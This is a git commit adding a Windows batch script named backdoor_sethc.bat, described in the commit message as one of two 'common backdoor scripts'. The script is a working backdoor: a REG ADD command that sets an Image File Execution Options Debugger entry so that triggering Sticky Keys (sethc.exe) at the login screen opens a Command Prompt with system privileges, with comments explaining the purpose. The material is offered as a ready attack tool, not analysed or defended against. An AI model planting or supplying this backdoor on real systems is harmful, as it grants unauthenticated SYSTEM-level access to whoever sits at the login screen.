a12ff22344db3c99a736ae626206acc59ad0ca2e
Pablo Brusseel <pablo.brusseel@hotmail.com>
2018-12-27 11:58:30 +0100

    Added batch directory
    Including two common backdoor scripts for utilman.exe and sethc.exe

---
+++ batch/backdoor_sethc.bat
@@ -0,0 +1,7 @@
+REM This script will bind Sticky Keys (sethc.exe) to spawn a Command Prompt shell
+REM It can be modified to spawn other .exe files if you provide it with the absolute path.
+REM The script is used to fire at login screen with system priveleges
+
+REM Run the backdoor with admin privileges!
+
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f
